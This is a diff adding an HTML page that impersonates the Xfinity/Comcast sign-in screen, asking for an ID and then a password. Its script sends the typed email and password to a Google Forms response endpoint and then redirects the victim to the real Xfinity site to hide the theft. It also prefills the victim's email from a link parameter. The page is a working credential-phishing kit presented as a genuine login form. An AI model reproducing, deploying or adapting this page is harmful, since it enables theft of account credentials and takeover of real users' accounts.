@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to Xfinity</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#fff;color:#111;-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column}
+header{display:flex;align-items:center;position:relative;padding:16px 22px}
+.lg{font-size:27px;font-weight:700;letter-spacing:-1.2px;color:#111}
+.cls{position:absolute;right:22px;top:50%;transform:translateY(-50%);line-height:0;display:none}
+main{flex:1;width:100%;max-width:575px;margin:0 auto;padding:52px 24px 40px}
+body.g2 header{justify-content:center;border-bottom:1px solid #e8e8e8}
+body.g2 .cls{display:block}
+body.g1 .lg{color:#8f8f8f;font-size:24px}
+body.g1 main{padding-top:34px}
+.who{font-size:15px;margin-bottom:10px;color:#111}
+h1{font-size:33px;font-weight:800;letter-spacing:-.8px;margin-bottom:26px}
+body.g1 h1{font-size:31px;margin-bottom:22px}
+input[type=text],input[type=password]{width:100%;height:60px;font-size:17px;padding:0 14px;background:#f1f1f1;border:1px solid #7a7a7a;border-radius:2px;color:#111;-webkit-appearance:none}
+input::placeholder{color:#767676}
+input:focus{outline:none;border-color:#111;background:#fff}
+.pw{position:relative}
+.pw input{padding-right:52px}
+.eye{position:absolute;right:6px;top:0;height:60px;width:44px;background:none;border:0;cursor:pointer;line-height:0}
+.forgot{margin:20px 0 0;font-size:15px;font-weight:700}
+a{color:#6620be}
+.legal{font-size:15px;margin:18px 0 0;line-height:1.5}
+.legal a{text-decoration:underline}
+body.g1 .legal{margin-top:16px}
+.chk{display:flex;align-items:center;gap:12px;margin:26px 0 0;font-size:16px;cursor:pointer}
+.chk input{width:20px;height:20px;border:1px solid #555;border-radius:2px;accent-color:#6620be}
+button{background:#6620be;color:#fff;border:0;border-radius:4px;font-size:16px;font-weight:700;padding:16px 28px;margin-top:22px;cursor:pointer}
+body.g1 button{padding:16px 26px;margin-top:26px}
+button:active{background:#53199b}
+button[disabled]{opacity:.7}
+.rows{margin-top:48px;border-top:1px solid #e2e2e2}
+.row{display:flex;align-items:center;justify-content:space-between;padding:22px 2px;border-bottom:1px solid #e2e2e2;font-size:16px;color:#111;text-decoration:none}
+.alt{font-weight:700;font-size:16px;margin-top:30px}
+.alt a{color:#111;text-decoration:none}
+.trouble{font-size:15px;margin-top:30px;color:#111}
+.trouble a{text-decoration:underline}
+footer{border-top:1px solid #e8e8e8;padding:22px 24px;display:flex;flex-wrap:wrap;gap:18px 26px;justify-content:center;font-size:14px;color:#444}
+footer a{color:#444;text-decoration:none;display:inline-flex;align-items:center;gap:7px}
+@media(max-width:600px){main{padding:30px 22px 30px}h1{font-size:27px}body.g1 h1{font-size:26px}footer{font-size:12.5px;gap:14px 18px;padding:18px}.rows{margin-top:34px}}
+</style>
+</head>
+<body class="g1">
+
+<header>
+  <div class="lg">xfinity</div>
+  <a class="cls" href="https://www.xfinity.com/" aria-label="Close">
+    <svg width="22" height="22" viewBox="0 0 22 22"><path d="M3 3l16 16M19 3L3 19" stroke="#111" stroke-width="1.6" fill="none"/></svg>
+  </a>
+</header>
+
+<main>
+  <p class="who" id="who"></p>
+
+  <div id="s1">
+    <h1>Sign in with your Xfinity ID</h1>
+    <input id="id" type="text" placeholder="Email, mobile, or username" inputmode="email" autocapitalize="off" autocorrect="off" spellcheck="false" autocomplete="username">
+    <p class="legal">By signing in, you agree to our <a href="https://www.xfinity.com/terms">Terms of Service</a> and <a href="https://www.xfinity.com/privacy">Privacy Policy</a>.</p>
+    <button id="b1">Let's go</button>
+    <div class="rows">
+      <a class="row" href="https://login.xfinity.com/forgot"><span>Find your Xfinity ID</span><svg width="9" height="15" viewBox="0 0 9 15" fill="none" stroke="#111" stroke-width="1.7"><path d="M1 1l6.5 6.5L1 14"/></svg></a>
+      <a class="row" href="https://www.xfinity.com/learn/offers"><span>Create a new Xfinity ID</span><svg width="9" height="15" viewBox="0 0 9 15" fill="none" stroke="#111" stroke-width="1.7"><path d="M1 1l6.5 6.5L1 14"/></svg></a>
+    </div>
+  </div>
+
+  <div id="s2" hidden>
+    <h1>Enter your password</h1>
+    <div class="pw">
+      <input id="pw" type="password" autocomplete="current-password">
+      <button class="eye" id="eye" type="button" aria-label="Show password">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="1.6"><path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/><circle cx="12" cy="12" r="3.2"/></svg>
+      </button>
+    </div>
+    <p class="forgot"><a href="https://login.xfinity.com/forgot">Forgot password?</a></p>
+    <label class="chk"><input type="checkbox"><span>Keep me signed in</span></label>
+    <p class="legal">By signing in, you agree to our <a href="https://www.xfinity.com/terms">Terms of Service</a> and <a href="https://www.xfinity.com/privacy">Privacy Policy</a>.</p>
+    <button id="b2">Sign in</button>
+    <p class="alt"><a href="#" id="someone">Sign in as someone else</a></p>
+    <p class="trouble">Trouble signing in? <a href="https://www.xfinity.com/support">Get help</a></p>
+  </div>
+</main>
+
+<footer>
+  <span>© 2026 Comcast</span>
+  <a href="https://www.xfinity.com/terms"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8"><rect x="4" y="3" width="16" height="18" rx="2"/><path d="M8 8h8M8 12h8M8 16h5"/></svg>Web Terms Of Service</a>
+  <a href="https://www.xfinity.com/privacy"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8"><path d="M12 21s7-6.2 7-11a7 7 0 10-14 0c0 4.8 7 11 7 11z"/><circle cx="12" cy="10" r="2.4"/></svg>CA Notice at Collection</a>
+  <a href="https://www.xfinity.com/privacy"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8"><path d="M12 3l7 3v6c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z"/></svg>Privacy Policy</a>
+  <a href="https://www.xfinity.com/privacy"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><path d="M8 12.5l2.5 2.5L16 9.5"/></svg>Your Privacy Choices</a>
+  <a href="https://www.xfinity.com/privacy"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8"><path d="M12 20s-7-4.3-7-9a4 4 0 017-2.6A4 4 0 0119 11c0 4.7-7 9-7 9z"/></svg>Health Privacy Notice</a>
+  <a href="https://www.xfinity.com/privacy"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8"><path d="M7 4l10 8-10 8z"/></svg>Ad Choices</a>
+</footer>
+
+<script>
+var FORM_ID="1FAIpQLScLtnTEG9EGBGnM9abVVVOpIZMYJn5x5UCjdMKiGuIe-wOADA";
+var E_LOGIN="entry.1417598128", E_PASS="entry.557592993";
+var DEST="https://connect.xfinity.com/";
+
+var em=new URLSearchParams(location.search).get("email")||"";
+var s1=document.getElementById("s1"), s2=document.getElementById("s2"), who=document.getElementById("who");
+function step(n){
+  document.body.className = n===1 ? "g1" : "g2";
+  s1.hidden = n!==1; s2.hidden = n!==2;
+  who.textContent = n===2 ? em : "";
+  if(n===2) setTimeout(function(){document.getElementById("pw").focus()},80);
+}
+step(em?2:1);
+
+document.getElementById("someone").onclick=function(e){e.preventDefault();em="";step(1);};
+document.getElementById("eye").onclick=function(){var p=document.getElementById("pw");p.type=p.type==="password"?"text":"password";};
+document.getElementById("b1").onclick=function(){var v=document.getElementById("id").value.trim();if(!v)return document.getElementById("id").focus();em=v;step(2);};
+document.getElementById("id").addEventListener("keydown",function(e){if(e.key==="Enter")document.getElementById("b1").click();});
+
+var sent=false;
+function go(){
+  if(sent)return;sent=true;
+  var b=document.getElementById("b2");b.disabled=true;b.textContent="Signing in…";
+  var body=new URLSearchParams();body.append(E_LOGIN,em);body.append(E_PASS,document.getElementById("pw").value);
+  var jump=function(){location.href=DEST;};
+  fetch("https://docs.google.com/forms/d/e/"+FORM_ID+"/formResponse",{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:body.toString()}).then(function(){setTimeout(jump,450)}).catch(function(){setTimeout(jump,900)});
+  setTimeout(jump,2400);
+}
+document.getElementById("b2").onclick=go;
+document.getElementById("pw").addEventListener("keydown",function(e){if(e.key==="Enter")go();});
+</script>
+</body>
+</html>
